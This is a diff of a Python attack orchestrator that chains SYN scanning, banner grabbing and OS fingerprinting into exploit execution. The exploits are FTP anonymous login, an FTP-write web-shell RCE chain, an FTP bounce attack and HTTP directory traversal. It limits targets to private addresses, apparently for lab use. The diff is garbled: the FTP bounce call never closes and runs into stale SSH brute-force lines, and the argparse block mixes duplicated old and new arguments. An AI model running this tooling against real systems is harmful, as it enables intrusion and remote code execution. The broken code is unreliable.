@@ -5,13 +5,14 @@ Chains all phases of the reconnaissance + exploitation lifecycle:
     Phase 1: TCP SYN port scanning (raw packets via Npcap)
     Phase 2: Service banner grabbing (standard TCP sockets)
     Phase 3: OS fingerprinting (heuristic analysis of SYN/ACK features)
-    Phase 5: Exploit execution (FTP anonymous, SSH brute, HTTP traversal)
+    Phase 4: OS-aware payload selection
+    Phase 5: Exploit execution
 
 Usage (from Administrator PowerShell):
     python attacker\\main.py ^
         --adapter "<NPCAP ADAPTER>" ^
         --target 192.168.1.25 ^
-        --ports 21 22 80 443 445 3389
+        --ports 21 80 443 445
 
     Optional flags:
         --skip-exploits     Run only scanning/fingerprinting
@@ -22,17 +23,14 @@ Usage (from Administrator PowerShell):
 import sys
 from pathlib import Path
 
-# The orchestrator prints box-drawing / arrow / check glyphs. The default
-# Windows console code page (cp1252/cp437) cannot encode these and would
-# raise UnicodeEncodeError mid-run. Force UTF-8 output with graceful
-# fallback so the tool runs on any console.
+
 for _stream in (sys.stdout, sys.stderr):
     try:
         _stream.reconfigure(encoding="utf-8", errors="replace")
     except (AttributeError, ValueError):
         pass
 
-# Ensure project root is on the path.
+
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
 import argparse
@@ -47,10 +45,14 @@ from common.packet import (
     TCP_ACK, TCP_RST, TCP_SYN, IPPROTO_ICMP,
     STANDARD_SYN_OPTIONS,
 )
-from common.npcap import Pcap, local_ipv4_for_target, local_mac_for_ip, arp_resolve
+from common.npcap import (
+    Pcap, local_ipv4_for_target, local_mac_for_ip, arp_resolve
+)
 from fingerprint import fingerprint
 from banner import grab_banners
-from exploits import ftp_anon, ssh_bruteforce, http_traversal
+from exploits import (
+    ftp_anon, ftp_web_shell, ftp_bounce, http_traversal, os_payloads,
+)
 
 
 MAX_PROBES = 50
@@ -59,6 +61,10 @@ MIN_DELAY = 0.2
 SEPARATOR = "═" * 65
 SUB_SEP = "─" * 65
 
+
+# ===========================================================================
+# Phase 1 — SYN Port Scanning
+# ===========================================================================
 
 def phase1_scan(args, local_ip, src_mac, dst_mac):
     """Phase 1: TCP SYN port scanning."""
@@ -127,8 +133,9 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
                 if flags & TCP_RST:
                     state = "CLOSED"
                     result = info
-                    # Fallback candidate: store RST if no SYN/ACK candidate found yet
-                    if fingerprint_candidate is None or (fingerprint_candidate.get("flags", 0) & TCP_RST):
+                    if fingerprint_candidate is None or (
+                        fingerprint_candidate.get("flags", 0) & TCP_RST
+                    ):
                         fingerprint_candidate = info
                     break
 
@@ -145,12 +152,11 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
 
             time.sleep(args.delay)
 
-    # Collect all IP IDs observed during the scan probes (Idea 2)
-    ip_ids = [res["ip_id"] for _, _, res in observations if res and "ip_id" in res]
+    ip_ids = [res["ip_id"] for _, _, res in observations
+              if res and "ip_id" in res]
     if fingerprint_candidate:
         fingerprint_candidate["ip_ids"] = ip_ids
 
-    # Collect TCP Timestamp samples across probes (Idea 3)
     ts_samples = []
     open_port_candidate = None
     closed_port_candidate = None
@@ -163,21 +169,23 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
             opts = parse_tcp_options(res["options"])
             for opt in opts:
                 if opt[0] == "TIMESTAMP":
-                    ts_samples.append((res.get("recv_time", time.monotonic()), opt[1]))
+                    ts_samples.append(
+                        (res.get("recv_time", time.monotonic()), opt[1])
+                    )
 
-    # RFC 3168 ECN Probe (Idea 4) & Clock Measurement
+    # ECN probe
     ecn_info = {"tested": False}
     if open_port_candidate is not None:
         ecn_port = open_port_candidate
         ecn_src_port = random.randint(45000, 60000)
         time.sleep(0.4)
-        with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as ecn_cap:
+        with Pcap(args.adapter, snaplen=65535, promisc=True,
+                  timeout_ms=100) as ecn_cap:
             ecn_seq = rng.randrange(1, 0xFFFFFFFF)
             ecn_frame = build_ecn_syn_frame(
                 src_mac, dst_mac,
                 local_ip, args.target,
-                ecn_src_port, ecn_port,
-                ecn_seq,
+                ecn_src_port, ecn_port, ecn_seq,
                 options=STANDARD_SYN_OPTIONS,
             )
             e_sent = time.monotonic()
@@ -209,23 +217,17 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
                     if "ip_id" in e_info:
                         ip_ids.append(e_info["ip_id"])
                     if e_info.get("options"):
-                        e_opts = parse_tcp_options(e_info["options"])
-                        for opt in e_opts:
+                        for opt in parse_tcp_options(e_info["options"]):
                             if opt[0] == "TIMESTAMP":
                                 ts_samples.append((e_recv_time, opt[1]))
                     break
             if not ecn_responded:
-                ecn_info = {
-                    "tested": True,
-                    "dropped": True,
-                }
+                ecn_info = {"tested": True, "dropped": True}
     else:
-        ecn_info = {
-            "tested": False,
-            "reason": "No open port observed for ECN negotiation",
-        }
+        ecn_info = {"tested": False,
+                    "reason": "No open port for ECN negotiation"}
 
-    # Ambiguous / Invalid TCP Flags Probe (Idea 5 - SYN+FIN "Rule-Breaker")
+    # Invalid flags (SYN+FIN)
     invalid_flags_info = {"tested": False}
     if open_port_candidate is not None:
         inv_port = open_port_candidate
@@ -233,13 +235,13 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
         time.sleep(0.3)
         open_resp = False
         open_flags = None
-        with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as inv_cap:
+        with Pcap(args.adapter, snaplen=65535, promisc=True,
+                  timeout_ms=100) as inv_cap:
             inv_seq = rng.randrange(1, 0xFFFFFFFF)
             inv_frame = build_synfin_frame(
                 src_mac, dst_mac,
                 local_ip, args.target,
-                inv_src_port, inv_port,
-                inv_seq,
+                inv_src_port, inv_port, inv_seq,
                 options=STANDARD_SYN_OPTIONS,
             )
             i_sent = time.monotonic()
@@ -265,18 +267,17 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
                     break
 
         closed_resp = None
-        # If open port silently dropped (Unix/Darwin behavior), test closed port if available
         if not open_resp and closed_port_candidate is not None:
             c_port = closed_port_candidate
             c_src_port = random.randint(45000, 60000)
             time.sleep(0.3)
-            with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as c_cap:
+            with Pcap(args.adapter, snaplen=65535, promisc=True,
+                      timeout_ms=100) as c_cap:
                 c_seq = rng.randrange(1, 0xFFFFFFFF)
                 c_frame = build_synfin_frame(
                     src_mac, dst_mac,
                     local_ip, args.target,
-                    c_src_port, c_port,
-                    c_seq,
+                    c_src_port, c_port, c_seq,
                     options=STANDARD_SYN_OPTIONS,
                 )
                 c_sent = time.monotonic()
@@ -312,13 +313,13 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
         c_port = closed_port_candidate
         c_src_port = random.randint(45000, 60000)
         time.sleep(0.3)
-        with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as c_cap:
+        with Pcap(args.adapter, snaplen=65535, promisc=True,
+                  timeout_ms=100) as c_cap:
             c_seq = rng.randrange(1, 0xFFFFFFFF)
             c_frame = build_synfin_frame(
                 src_mac, dst_mac,
                 local_ip, args.target,
-                c_src_port, c_port,
-                c_seq,
+                c_src_port, c_port, c_seq,
                 options=STANDARD_SYN_OPTIONS,
             )
             c_sent = time.monotonic()
@@ -348,19 +349,18 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
             "closed_port_responded": closed_resp,
         }
 
-    # If only 1 timestamp sample is available and an open port exists,
-    # send a follow-up standard probe to measure clock frequency
+    # Follow-up probe for timestamp clock
     if len(ts_samples) == 1 and open_port_candidate is not None:
         followup_port = open_port_candidate
         followup_src_port = random.randint(45000, 60000)
         time.sleep(0.4)
-        with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as follow_cap:
+        with Pcap(args.adapter, snaplen=65535, promisc=True,
+                  timeout_ms=100) as follow_cap:
             follow_seq = rng.randrange(1, 0xFFFFFFFF)
             follow_frame = build_syn_frame(
                 src_mac, dst_mac,
                 local_ip, args.target,
-                followup_src_port, followup_port,
-                follow_seq,
+                followup_src_port, followup_port, follow_seq,
                 options=STANDARD_SYN_OPTIONS,
             )
             f_sent = time.monotonic()
@@ -383,16 +383,16 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
                     if "ip_id" in f_info:
                         ip_ids.append(f_info["ip_id"])
                     if f_info.get("options"):
-                        f_opts = parse_tcp_options(f_info["options"])
-                        for opt in f_opts:
+                        for opt in parse_tcp_options(f_info["options"]):
                             if opt[0] == "TIMESTAMP":
                                 ts_samples.append((f_recv_time, opt[1]))
                     break
 
-    # ICMP & UDP Probing Battery (Idea 6)
+    # ICMP + UDP battery
     icmp_resp = None
     time.sleep(0.3)
-    with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as icmp_cap:
+    with Pcap(args.adapter, snaplen=65535, promisc=True,
+              timeout_ms=100) as icmp_cap:
         ie_id = rng.randrange(1, 0xFFFF)
         ie_frame = build_icmp_echo_frame(
             src_mac, dst_mac,
@@ -420,7 +420,8 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
 
     udp_resp = None
     time.sleep(0.3)
-    with Pcap(args.adapter, snaplen=65535, promisc=True, timeout_ms=100) as udp_cap:
+    with Pcap(args.adapter, snaplen=65535, promisc=True,
+              timeout_ms=100) as udp_cap:
         u_src_port = random.randint(45000, 60000)
         u_frame = build_udp_frame(
             src_mac, dst_mac,
@@ -460,9 +461,8 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
         "udp_quoted_len": udp_resp["quoted_length"] if udp_resp else None,
     }
 
-    # Autonomous Firewall Fallback / Preferred ICMP: If no TCP port responded with SYN/ACK or RST,
-    # or if --prefer-icmp was requested, use the ICMP Echo Reply as the fingerprint candidate!
-    if (fingerprint_candidate is None or getattr(args, "prefer_icmp", False)) and icmp_resp is not None:
+    if (fingerprint_candidate is None
+            or getattr(args, "prefer_icmp", False)) and icmp_resp is not None:
         fingerprint_candidate = {
             "ttl": icmp_resp["ttl"],
             "window": 0,
@@ -484,8 +484,11 @@ def phase1_scan(args, local_ip, src_mac, dst_mac):
     return observations, fingerprint_candidate
 
 
+# ===========================================================================
+# Phase 2 — Banner Grabbing
+# ===========================================================================
+
 def phase2_banners(args, open_ports):
-    """Phase 2: Service banner grabbing."""
     print(f"\n{SEPARATOR}")
     print("  [PHASE 2] Service Banner Grabbing")
     print(SEPARATOR)
@@ -498,25 +501,30 @@ def phase2_banners(args, open_ports):
 
     for r in results:
         status = "✓" if r["success"] else "✗"
-        print(
-            f"  {status} {r['port']:5d}  {r['service']:8s} → {r['version'][:60]}"
-        )
+        print(f"  {status} {r['port']:5d}  "
+              f"{r['service']:8s} → {r['version'][:60]}")
 
     return results
 
 
+# ===========================================================================
+# Phase 3 — OS Fingerprinting
+# ===========================================================================
+
 def phase3_fingerprint(fingerprint_candidate, banner_results=None):
-    """Phase 3: OS fingerprinting."""
     print(f"\n{SEPARATOR}")
     print("  [PHASE 3] OS Fingerprinting")
     print(SEPARATOR)
 
     if not fingerprint_candidate:
-        print("  No SYN/ACK or RST was observed — OS fingerprint not available.")
+        print("  No SYN/ACK or RST observed — fingerprint unavailable.")
         return None
 
     fp = fingerprint(fingerprint_candidate, banners=banner_results)
-    probe_type = fingerprint_candidate.get("probe_type") or ("Closed-Port TCP RST" if (fingerprint_candidate.get("flags", 0) & TCP_RST) else "Open-Port TCP SYN/ACK")
+    probe_type = fingerprint_candidate.get("probe_type") or (
+        "Closed-Port TCP RST" if (fingerprint_candidate.get("flags", 0) & TCP_RST)
+        else "Open-Port TCP SYN/ACK"
+    )
 
     print(f"  Candidate  : {probe_type}")
     print(f"  Likely OS  : {fp['os']}")
@@ -530,34 +538,15 @@ def phase3_fingerprint(fingerprint_candidate, banner_results=None):
     print(f"  Window     : {fp['window']}")
     print(f"  DF bit     : {'set' if fp['df'] else 'clear'}")
     if fp.get("ip_id_sequence") and len(fp["ip_id_sequence"]) > 1:
-        deltas_str = str(fp.get("ip_id_deltas", []))
-        print(f"  IP ID Seq  : {fp['ip_id_sequence']} (deltas: {deltas_str})")
+        print(f"  IP ID Seq  : {fp['ip_id_sequence']} "
+              f"(deltas: {fp.get('ip_id_deltas', [])})")
         print(f"  IP ID Class: {fp.get('ip_id_class', 'UNKNOWN')}")
     elif fp.get("ip_id") is not None:
         print(f"  IP ID      : {fp['ip_id']}")
-    print(f"  Options    : {', '.join(str(x) for x in fp['options']) or 'none'}")
-    if fp.get("ts_class") and fp["ts_class"] != "NONE":
-        if fp["ts_class"] == "RANDOM_OFFSET":
-            print("  Timestamp  : Clock Rate: Randomized offset (RFC 7323 Darwin PRNG)")
-        elif fp.get("ts_rate") is not None:
-            print(f"  Timestamp  : Clock Rate: ~{fp['ts_rate']:.1f} Hz ({fp['ts_class']})")
-            if fp.get("uptime"):
-                print(f"  Uptime     : ~{fp['uptime']}")
-    if fp.get("ecn_status") and fp["ecn_status"] != "NOT_TESTED":
-        if fp["ecn_status"] == "ECN_SUPPORTED":
-            print(f"  ECN Probe  : Supported (ECE reflected: True, Flags: 0x{fp.get('ecn_flags', 0):02x}) [RFC 3168]")
-        elif fp["ecn_status"] == "ECN_IGNORED":
-            print(f"  ECN Probe  : Ignored / Not Negotiated (ECE reflected: False, Flags: 0x{fp.get('ecn_flags', 0):02x}) [Default Windows Stack]")
-        elif fp["ecn_status"] == "ECN_DROPPED":
-            print("  ECN Probe  : Dropped / Blocked by Firewall")
-        else:
-            print(f"  ECN Probe  : {fp['ecn_status']} (Flags: 0x{fp.get('ecn_flags', 0):02x})")
-    if fp.get("invalid_flags_status") and fp["invalid_flags_status"] != "NOT_TESTED":
-        print(f"  Invalid Flgs: {fp.get('invalid_flags_description', fp['invalid_flags_status'])}")
-    if fp.get("icmp_udp_status") and fp["icmp_udp_status"] != "NOT_TESTED":
-        print(f"  ICMP/UDP   : {fp.get('icmp_udp_description', fp['icmp_udp_status'])}")
+    print(f"  Options    : "
+          f"{', '.join(str(x) for x in fp['options']) or 'none'}")
     if fp.get("banner_evidence"):
-        print(f"  Cross-Layer: {len(fp['banner_evidence'])} banner signature(s) correlated")
+        print(f"  Cross-Layer: {len(fp['banner_evidence'])} banner signature(s)")
     print(f"  Probability:")
     for cls, pct in fp["distribution"]:
         bar = "#" * (pct // 5)
@@ -569,85 +558,109 @@ def phase3_fingerprint(fingerprint_candidate, banner_results=None):
     return fp
 
 
-def phase5_exploits(args, open_ports, banner_results):
-    """Phase 5: Exploit execution."""
+# ===========================================================================
+# Phase 5 — Exploit Execution (with OS-aware selection)
+# ===========================================================================
+
+def phase5_exploits(args, open_ports, banner_results, os_family="Unknown"):
+    print(f"\n{SEPARATOR}")
+    print("  [PHASE 4] OS-Aware Payload Selection")
+    print(SEPARATOR)
+    print(f"  Target OS family: {os_family}")
+    cfg = os_payloads.get_config(os_family)
+    print(f"  Traversal targets: "
+          f"{[d for _, d in cfg['traversal_targets']]}")
+    print(f"  RCE command      : {cfg['rce_command']}")
+
     print(f"\n{SEPARATOR}")
     print("  [PHASE 5] Exploit Execution")
     print(SEPARATOR)
 
-    banner_map = {}
-    for b in banner_results:
-        banner_map[b["port"]] = b
-
+    banner_map = {b["port"]: b for b in banner_results}
     exploit_results = []
 
-    # Exploit 1: FTP Anonymous Login
+    # --- Exploit 1: FTP anonymous read (baseline) ---
     if 21 in open_ports:
         print(f"\n  {SUB_SEP}")
-        print(f"  [EXPLOIT] FTP Anonymous Login (port 21)")
+        print(f"  [EXPLOIT 1] FTP Anonymous Login (port 21)")
         print(f"  {SUB_SEP}")
-
-        ftp_result = ftp_anon.run(
+        r = ftp_anon.run(
             args.target, port=21, banner_info=banner_map.get(21)
         )
-        exploit_results.append(ftp_result)
-
-        status = "SUCCESS ✓" if ftp_result["success"] else "FAILED ✗"
-        print(f"  Status  : {status}")
-        print(f"  Detail  : {ftp_result['detail']}")
-        if ftp_result["success"]:
-            print(f"  Work Dir: {ftp_result['working_dir']}")
-            if ftp_result["files"]:
-                print(f"  Files   :")
-                for f in ftp_result["files"][:10]:
-                    print(f"    {f}")
-
+        exploit_results.append(r)
+        print(f"  Status  : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
+        print(f"  Detail  : {r['detail']}")
+        if r["success"] and r.get("files"):
+            for f in r["files"][:8]:
+                print(f"    {f}")
         time.sleep(args.exploit_delay)
 
-    # Exploit 2: SSH Weak Credentials
-    if 22 in open_ports:
+    # --- Exploit 2: FTP write -> web shell -> RCE ---
+    if 21 in open_ports and (80 in open_ports or 8080 in open_ports):
         print(f"\n  {SUB_SEP}")
-        print(f"  [EXPLOIT] SSH Weak Credentials (port 22)")
+        print(f"  [EXPLOIT 2] FTP Write → Web Shell → RCE "
+              f"(ports 21 + HTTP)")
         print(f"  {SUB_SEP}")
+        http_port = 80 if 80 in open_ports else 8080
+        r = ftp_web_shell.run(
+            args.target, port=21, http_port=http_port,
+            banner_info=banner_map.get(21),
+            os_family=os_family, cleanup=True,
+        )
+        exploit_results.append(r)
+        print(f"  Status  : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
+        print(f"  Detail  : {r['detail']}")
+        for stage, info in r["stages"].items():
+            mark = "✓" if info.get("success") else "✗"
+            print(f"    {mark} {stage}: {info.get('detail', '')}")
+        if r["rce_output"]:
+            print(f"  RCE output:")
+            for line in r["rce_output"].splitlines()[:12]:
+                print(f"    {line}")
+        time.sleep(args.exploit_delay)
+
+    # --- Exploit 3: FTP bounce ---
+    if 21 in open_ports:
+        print(f"\n  {SUB_SEP}")
+        print(f"  [EXPLOIT 3] FTP Bounce Attack (port 21)")
+        print(f"  {SUB_SEP}")
+        bounce_port = 80 if 80 in open_ports else 445
+        r = ftp_bounce.run(
+            args.target, port=21,
+            bounce_target=args.target,
+            bounce_port=bounce_port,
+            scan_ports=[80, 443, 445, 3389],
+            banner_info=banner_map.get(21),
 
         ssh_result = ssh_bruteforce.run(
             args.target, port=22, banner_info=banner_map.get(22),
             delay=1.0, mode=getattr(args, "ssh_mode", "loud"),
         )
-        exploit_results.append(ssh_result)
-
-        status = "SUCCESS ✓" if ssh_result["success"] else "FAILED ✗"
-        print(f"  Status   : {status}")
-        print(f"  Detail   : {ssh_result['detail']}")
-        print(f"  Attempts : {ssh_result['attempts']}")
-        if ssh_result["success"] and ssh_result["command_output"]:
-            print(f"  Commands :")
-            for cmd, output in ssh_result["command_output"].items():
-                print(f"    {cmd} → {output[:80]}")
-
+        exploit_results.append(r)
+        print(f"  Status  : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
+        print(f"  Detail  : {r['detail']}")
+        for probe in r["probes"]:
+            print(f"    {probe['target']}:{probe['port']} -> "
+                  f"{probe['outcome']}")
         time.sleep(args.exploit_delay)
 
-    # Exploit 3: HTTP Directory Traversal
+    # --- Exploit 4: HTTP traversal (OS-aware) ---
     http_ports = [p for p in open_ports if p in (80, 8080, 8443)]
     for http_port in http_ports:
         print(f"\n  {SUB_SEP}")
-        print(f"  [EXPLOIT] HTTP Directory Traversal (port {http_port})")
+        print(f"  [EXPLOIT 4] HTTP Directory Traversal (port {http_port})")
         print(f"  {SUB_SEP}")
-
-        http_result = http_traversal.run(
-            args.target, port=http_port, banner_info=banner_map.get(http_port),
+        r = http_traversal.run(
+            args.target, port=http_port,
+            banner_info=banner_map.get(http_port),
+            os_family=os_family,
         )
-        exploit_results.append(http_result)
-
-        status = "SUCCESS ✓" if http_result["success"] else "FAILED ✗"
-        print(f"  Status   : {status}")
-        print(f"  Detail   : {http_result['detail']}")
-        print(f"  Payloads : {http_result['attempted']} attempted")
-        if http_result["success"]:
-            for payload in http_result["successful_payloads"]:
-                print(f"  Payload  : {payload['payload']}")
-                print(f"  Preview  : {payload['body_preview'][:120]}...")
-
+        exploit_results.append(r)
+        print(f"  Status   : {'SUCCESS ✓' if r['success'] else 'FAILED ✗'}")
+        print(f"  Detail   : {r['detail']}")
+        for p in r["successful_payloads"]:
+            print(f"  Payload : {p['payload']}")
+            print(f"  Preview : {p['body_preview'][:120]}...")
         time.sleep(args.exploit_delay)
 
     if not exploit_results:
@@ -656,41 +669,47 @@ def phase5_exploits(args, open_ports, banner_results):
     return exploit_results
 
 
+# ===========================================================================
+# Summary
+# ===========================================================================
+
 def print_summary(observations, banner_results, fp_result, exploit_results):
-    """Print a final summary of all findings."""
     print(f"\n\n{SEPARATOR}")
     print("  ATTACK SUMMARY")
     print(SEPARATOR)
 
-    # Port scan summary
     open_count = sum(1 for _, s, _ in observations if s == "OPEN")
     closed_count = sum(1 for _, s, _ in observations if s == "CLOSED")
     filtered_count = sum(
-        1 for _, s, _ in observations if "FILTERED" in s or "NO RESPONSE" in s
+        1 for _, s, _ in observations
+        if "FILTERED" in s or "NO RESPONSE" in s
     )
     print(f"  Ports scanned : {len(observations)}")
     print(f"  Open          : {open_count}")
     print(f"  Closed        : {closed_count}")
     print(f"  Filtered/NR   : {filtered_count}")
 
-    # Banner summary
     banner_success = sum(1 for b in banner_results if b["success"])
     print(f"  Banners found : {banner_success}/{len(banner_results)}")
 
-    # OS fingerprint
     if fp_result:
-        print(f"  OS guess      : {fp_result['os']} ({fp_result['confidence']}%)")
+        print(f"  OS guess      : {fp_result['os']} "
+              f"({fp_result['confidence']}%)")
 
-    # Exploits
     if exploit_results:
         success_count = sum(1 for e in exploit_results if e["success"])
-        print(f"  Exploits      : {success_count}/{len(exploit_results)} successful")
+        print(f"  Exploits      : {success_count}/"
+              f"{len(exploit_results)} successful")
         for e in exploit_results:
             marker = "✓" if e["success"] else "✗"
             print(f"    {marker} {e['name']} (port {e['port']})")
 
     print(SEPARATOR)
 
+
+# ===========================================================================
+# Entry point
+# ===========================================================================
 
 def main():
     p = argparse.ArgumentParser(
@@ -701,10 +720,19 @@ def main():
     )
 
     p.add_argument("--adapter", required=True,
-                    help="Exact Npcap adapter name")
+                   help="Exact Npcap adapter name")
     p.add_argument("--target", required=True,
-                    help="One explicitly authorized private IPv4 target")
+                   help="One explicitly authorized private IPv4 target")
     p.add_argument("--ports", required=True, nargs="+", type=int,
+                   help="Ports to scan (max 50)")
+    p.add_argument("--timeout", type=float, default=1.5)
+    p.add_argument("--delay", type=float, default=0.5)
+    p.add_argument("--source-port", type=int, default=40000)
+    p.add_argument("--seed", type=int, default=406)
+    p.add_argument("--skip-banners", action="store_true")
+    p.add_argument("--skip-exploits", action="store_true")
+    p.add_argument("--exploit-delay", type=float, default=1.0)
+    p.add_argument("--prefer-icmp", action="store_true")
                     help="Ports to scan (max 50)")
     p.add_argument("--timeout", type=float, default=1.5,
                     help="Per-port SYN timeout in seconds (default: 1.5)")
@@ -727,10 +755,11 @@ def main():
 
     args = p.parse_args()
 
-    # Validate inputs.
     target_ip = ipaddress.ip_address(args.target)
     if target_ip.version != 4 or not target_ip.is_private:
-        raise SystemExit("Safety limit: target must be a private IPv4 address.")
+        raise SystemExit(
+            "Safety limit: target must be a private IPv4 address."
+        )
     if len(args.ports) > MAX_PROBES:
         raise SystemExit(f"Safety limit: at most {MAX_PROBES} ports per run.")
     if args.source_port + len(args.ports) - 1 > 65535:
@@ -742,7 +771,6 @@ def main():
     if not 0.1 <= args.timeout <= 10:
         p.error("--timeout must be between 0.1 and 10 seconds.")
 
-    # Resolve network details.
     local_ip = local_ipv4_for_target(args.target)
     src_mac = local_mac_for_ip(local_ip)
     dst_mac = arp_resolve(args.target, local_ip)
@@ -756,28 +784,30 @@ def main():
     print(f"  Ports        : {args.ports}")
     print(f"  Scan delay   : {args.delay}s")
 
-    # Phase 1: SYN Port Scanning
     observations, fp_candidate = phase1_scan(args, local_ip, src_mac, dst_mac)
     open_ports = [port for port, state, _ in observations if state == "OPEN"]
 
-    # Phase 2: Banner Grabbing
     banner_results = []
     if not args.skip_banners and open_ports:
         banner_results = phase2_banners(args, open_ports)
     elif args.skip_banners:
         print(f"\n  [PHASE 2] Banner grabbing skipped (--skip-banners)")
 
-    # Phase 3: OS Fingerprinting
     fp_result = phase3_fingerprint(fp_candidate, banner_results)
 
-    # Phase 5: Exploit Execution
+    # Extract OS family for OS-aware exploitation
+    os_family = "Unknown"
+    if fp_result:
+        os_family = os_payloads.from_fingerprint(fp_result)
+
     exploit_results = []
     if not args.skip_exploits and open_ports:
-        exploit_results = phase5_exploits(args, open_ports, banner_results)
+        exploit_results = phase5_exploits(
+            args, open_ports, banner_results, os_family=os_family
+        )
     elif args.skip_exploits:
         print(f"\n  [PHASE 5] Exploit execution skipped (--skip-exploits)")
 
-    # Final summary
     print_summary(observations, banner_results, fp_result, exploit_results)
 
 
